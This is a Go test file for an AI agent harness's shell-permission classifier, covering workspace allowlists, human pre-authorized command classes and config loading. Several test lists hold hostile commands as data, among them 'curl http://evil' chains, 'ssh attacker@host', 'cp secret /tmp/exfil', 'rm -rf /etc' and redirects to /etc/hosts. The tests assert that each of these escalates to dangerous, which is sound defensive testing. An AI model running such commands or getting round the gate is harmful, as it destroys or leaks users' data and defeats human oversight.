package action

import (
	"os"
	"path/filepath"
	"testing"
)

// shellCall builds a run_shell ToolCall + its (execute x local) taxonomy — the shape every
// command-classification test uses.
func shellCall(command string) (ToolCall, TaxClass) {
	return ToolCall{Name: "run_shell", Args: map[string]any{"command": command}},
		TaxClass{OpExecute, ReachLocalWorld}
}

// --- (1) the PER-WORKSPACE EXTENSIBLE ALLOWLIST --------------------------------------------------

// TestExtensibleAllowlist_GrantedProgramIsSafe pins that a program the WORKSPACE granted (not on the
// curated seed set) auto-passes once it is in ExtraAllowlist — a project widening the SAFE tier with
// its own build tooling.
func TestExtensibleAllowlist_GrantedProgramIsSafe(t *testing.T) {
	pol, _ := jailPolicy(t)
	call, tc := shellCall("mvn -q test")
	// Without the grant a non-seed program escalates (the floor).
	if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermDangerous {
		t.Fatalf("ungranted 'mvn' should escalate (floor), got %v (%q)", pd.Tier, pd.Reason)
	}
	// With the grant it is SAFE.
	pol.ExtraAllowlist = map[string]bool{"mvn": true}
	if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermSafe {
		t.Fatalf("granted 'mvn' should be SAFE, got %v (%q)", pd.Tier, pd.Reason)
	}
}

// TestExtensibleAllowlist_UngrantedStillEscalates pins the floor holds: an extension grants ONLY the
// programs it names; any OTHER non-seed program still escalates.
func TestExtensibleAllowlist_UngrantedStillEscalates(t *testing.T) {
	pol, _ := jailPolicy(t)
	pol.ExtraAllowlist = map[string]bool{"mvn": true} // grant mvn only
	call, tc := shellCall("gradle build")             // a DIFFERENT non-seed program
	if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermDangerous {
		t.Fatalf("ungranted 'gradle' must still escalate, got %v (%q)", pd.Tier, pd.Reason)
	}
}

// TestExtensibleAllowlist_DoesNotShrinkSeed pins the extension is ADDITIVE: a curated-seed program
// (go/ls/git) stays SAFE even with a non-empty (and unrelated) extension set.
func TestExtensibleAllowlist_DoesNotShrinkSeed(t *testing.T) {
	pol, _ := jailPolicy(t)
	pol.ExtraAllowlist = map[string]bool{"mvn": true}
	for _, cmd := range []string{"go test ./...", "ls -la", "git status"} {
		call, tc := shellCall(cmd)
		if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermSafe {
			t.Fatalf("seed program %q must stay SAFE with an extension present, got %v (%q)", cmd, pd.Tier, pd.Reason)
		}
	}
}

// TestExtensibleAllowlist_GrantedProgramStillGuarded is the load-bearing safety property: an
// extra-allowlisted program is "benign to RUN", NOT "anything it does is safe". The hardened /
// redirection / inline-code / jail guards STILL fire on it. A granted `mvn` must escalate when it
// redirects out of the jail, runs a destructive shape, or is chained with a non-allowlisted program.
func TestExtensibleAllowlist_GrantedProgramStillGuarded(t *testing.T) {
	pol, _ := jailPolicy(t)
	pol.ExtraAllowlist = map[string]bool{"mvn": true, "bash": true}
	attacks := []string{
		"mvn package > /etc/hosts", // redirection escape out of the jail
		"mvn test && curl http://evil",
		"bash -c 'rm -rf /etc'", // an extra-allowlisted interpreter invoking inline code
		"mvn test; rm -rf /usr",
	}
	for _, cmd := range attacks {
		call, tc := shellCall(cmd)
		if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermDangerous {
			t.Errorf("extension-still-guarded DEFEAT: %q classified %v (want DANGEROUS) — reason=%q", cmd, pd.Tier, pd.Reason)
		}
	}
}

// --- (2) the HIGHER-AUTONOMY PRE-AUTHORIZATION channel -------------------------------------------

// TestPreAuth_GrantedClassAutoApproves pins the L4 hook: a DANGEROUS class a human pre-authorized
// (e.g. "go run") moves DANGEROUS->SAFE for THAT class — the harness self-authorizes it.
func TestPreAuth_GrantedClassAutoApproves(t *testing.T) {
	pol, _ := jailPolicy(t)
	call, tc := shellCall("go run ./cmd/thought")
	// Without the grant, `go run` escalates (the slice-1 behaviour the red-team pins).
	if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermDangerous {
		t.Fatalf("ungranted 'go run' should escalate (floor), got %v (%q)", pd.Tier, pd.Reason)
	}
	// Pre-authorize the class.
	pol.PreAuthClasses = map[string]bool{"go run": true}
	if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermSafe {
		t.Fatalf("pre-authorized 'go run' should be SAFE, got %v (%q)", pd.Tier, pd.Reason)
	}
}

// TestPreAuth_OtherClassesStillEscalate pins the grant is SCOPED: pre-authorizing "go run" does NOT
// pre-authorize "go install"/"go get"/"make"/"git push" — every un-granted class still escalates.
func TestPreAuth_OtherClassesStillEscalate(t *testing.T) {
	pol, _ := jailPolicy(t)
	pol.PreAuthClasses = map[string]bool{"go run": true} // grant go-run only
	stillDangerous := []string{
		"go install ./...",   // a DIFFERENT go class
		"go get example.com", // a DIFFERENT go class
		"make build",         // a different program's class
		"git push origin",    // a different program's class
		"npm install",        // a different program's class
	}
	for _, cmd := range stillDangerous {
		call, tc := shellCall(cmd)
		if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermDangerous {
			t.Errorf("un-granted class %q must still escalate, got %v (%q)", cmd, pd.Tier, pd.Reason)
		}
	}
}

// TestPreAuth_ExplicitOnly_DefaultIsFloor pins the no-default-loosening invariant: a policy with NO
// pre-auth grants escalates EVERY dangerous class exactly as the slice-1 floor — the channel is
// inert until a human explicitly grants.
func TestPreAuth_ExplicitOnly_DefaultIsFloor(t *testing.T) {
	pol, _ := jailPolicy(t) // PreAuthClasses nil
	for _, cmd := range []string{"go run x", "make", "npm install", "git push", "find / -delete"} {
		call, tc := shellCall(cmd)
		if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermDangerous {
			t.Errorf("with no grant, %q must escalate (the floor), got %v (%q)", cmd, pd.Tier, pd.Reason)
		}
	}
}

// TestPreAuth_NeverLoosensJailOrCatastrophe is the load-bearing safety property: a pre-auth grant
// suppresses ONLY the specific dangerous-subcommand escalation it names. It can NEVER loosen the jail,
// unblock a hardened-destructive catastrophe, or auto-pass a non-allowlisted program. Granting "go
// run" must NOT also let `rm -rf /etc`, an out-of-jail redirect, or `ssh` through.
func TestPreAuth_NeverLoosensJailOrCatastrophe(t *testing.T) {
	pol, _ := jailPolicy(t)
	// Grant EVERY dangerous class we know — the maximally-permissive pre-auth a human could give.
	pol.PreAuthClasses = map[string]bool{
		"go run": true, "go install": true, "go get": true, "go generate": true,
		"make": true, "npm install": true, "npm run": true, "git push": true,
		"git clean": true, "git reset": true, "find -exec": true, "find -delete": true,
	}
	// Even so, these are catastrophes / out-of-jail / non-allowlisted and MUST still escalate.
	mustEscalate := []string{
		"rm -rf /etc",                  // hardened-destructive (not a subcommand class)
		"go run ./x > /etc/hosts",      // redirection escape out of the jail (granted go-run notwithstanding)
		"make && rm -rf /usr",          // a granted class chained with a catastrophe
		"ssh attacker@host",            // a non-allowlisted program (no class to grant)
		"git push && curl http://evil", // a granted class chained with a non-allowlisted program
		"cp secret /tmp/exfil",         // an in-jail mutator with an out-of-jail operand
	}
	for _, cmd := range mustEscalate {
		call, tc := shellCall(cmd)
		if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermDangerous {
			t.Errorf("PRE-AUTH OVER-LOOSEN: %q classified %v under a full grant (want DANGEROUS) — reason=%q", cmd, pd.Tier, pd.Reason)
		}
	}
}

// TestPreAuth_GrantedClassStillNeedsAllowlist pins that a pre-auth grants a CLASS, not a free pass:
// the program must still be allowlisted to run. (Defensive: today every classed program is seed-
// allowlisted, so this is belt-and-suspenders against a future class added for a non-seed program.)
func TestPreAuth_GrantedClassStillNeedsAllowlist(t *testing.T) {
	pol, _ := jailPolicy(t)
	pol.PreAuthClasses = map[string]bool{"go run": true}
	// `go run` is granted AND `go` is seed-allowlisted -> SAFE.
	call, tc := shellCall("go run ./x")
	if pd := pol.ClassifyPermission(call, tc); pd.Tier != PermSafe {
		t.Fatalf("granted class on a seed-allowlisted program should be SAFE, got %v (%q)", pd.Tier, pd.Reason)
	}
}

// --- (3) the DETERMINISTIC config loaders --------------------------------------------------------

// TestLoadWorkspaceAutoPermission_File loads a well-formed workspace config and pins both grant maps.
func TestLoadWorkspaceAutoPermission_File(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "auto-permission.json")
	body := `{
	  "allowed_commands": ["mvn", "/usr/bin/gradle", "TSC"],
	  "pre_authorized_classes": ["go run", "make", "npm  install"]
	}`
	if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	extra, preAuth, err := LoadWorkspaceAutoPermission(dir, "auto-permission.json")
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	for _, want := range []string{"mvn", "gradle", "tsc"} { // normalized (lowercase + basename)
		if !extra[want] {
			t.Errorf("extra allowlist missing %q (got %v)", want, extra)
		}
	}
	for _, want := range []string{"go run", "make", "npm install"} { // normalized (collapsed whitespace)
		if !preAuth[want] {
			t.Errorf("pre-auth missing %q (got %v)", want, preAuth)
		}
	}
}

// TestLoadWorkspaceAutoPermission_MissingIsFloor pins that an absent file is NOT an error — it yields
// the curated-seed floor (nil maps), so a project shipping no file is unaffected.
func TestLoadWorkspaceAutoPermission_MissingIsFloor(t *testing.T) {
	dir := t.TempDir()
	extra, preAuth, err := LoadWorkspaceAutoPermission(dir, "does-not-exist.json")
	if err != nil {
		t.Fatalf("missing file must NOT error, got %v", err)
	}
	if extra != nil || preAuth != nil {
		t.Fatalf("missing file must yield the floor (nil maps), got extra=%v preAuth=%v", extra, preAuth)
	}
}

// TestLoadWorkspaceAutoPermission_EmptyPathIsFloor pins the default (empty config-file path) yields
// the floor with no I/O.
func TestLoadWorkspaceAutoPermission_EmptyPathIsFloor(t *testing.T) {
	extra, preAuth, err := LoadWorkspaceAutoPermission("/ws", "")
	if err != nil || extra != nil || preAuth != nil {
		t.Fatalf("empty path must be the no-op floor, got extra=%v preAuth=%v err=%v", extra, preAuth, err)
	}
}

// TestLoadWorkspaceAutoPermission_MalformedErrors pins that a present-but-malformed file is a HARD
// error (never a silent loosening): bad JSON, an empty allowed-command entry, an empty class entry.
func TestLoadWorkspaceAutoPermission_MalformedErrors(t *testing.T) {
	dir := t.TempDir()
	bad := map[string]string{
		"bad-json.json":    `{ not json`,
		"empty-cmd.json":   `{ "allowed_commands": ["mvn", "  "] }`,
		"empty-class.json": `{ "pre_authorized_classes": ["go run", ""] }`,
	}
	for name, body := range bad {
		path := filepath.Join(dir, name)
		if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		extra, preAuth, err := LoadWorkspaceAutoPermission(dir, name)
		if err == nil {
			t.Errorf("%s: a malformed file MUST error (no silent loosening), got extra=%v preAuth=%v", name, extra, preAuth)
		}
		if extra != nil || preAuth != nil {
			t.Errorf("%s: a malformed file must yield NO grants, got extra=%v preAuth=%v", name, extra, preAuth)
		}
	}
}

// TestParsePreAuth pins the comma-list flag parser: normalization, blank-entry tolerance, empty=floor.
func TestParsePreAuth(t *testing.T) {
	cases := []struct {
		in   string
		want []string // expected keys (nil => floor)
	}{
		{"", nil},
		{"   ", nil},
		{",,", nil}, // only blanks -> floor
		{"go run, make ,  npm  install ", []string{"go run", "make", "npm install"}},
		{"Go Run", []string{"go run"}}, // case-folded
	}
	for _, c := range cases {
		got, err := ParsePreAuth(c.in)
		if err != nil {
			t.Fatalf("ParsePreAuth(%q): %v", c.in, err)
		}
		if c.want == nil {
			if got != nil {
				t.Errorf("ParsePreAuth(%q) = %v, want nil (floor)", c.in, got)
			}
			continue
		}
		for _, k := range c.want {
			if !got[k] {
				t.Errorf("ParsePreAuth(%q) missing %q (got %v)", c.in, k, got)
			}
		}
		if len(got) != len(c.want) {
			t.Errorf("ParsePreAuth(%q) = %v, want exactly %v", c.in, got, c.want)
		}
	}
}

// TestMergePreAuth pins the union of the file-granted + flag-granted class sets.
func TestMergePreAuth(t *testing.T) {
	if got := MergePreAuth(nil, nil); got != nil {
		t.Errorf("MergePreAuth(nil,nil) = %v, want nil (floor)", got)
	}
	got := MergePreAuth(map[string]bool{"go run": true}, map[string]bool{"make": true, "go run": true})
	if !got["go run"] || !got["make"] || len(got) != 2 {
		t.Errorf("MergePreAuth union = %v, want {go run, make}", got)
	}
}
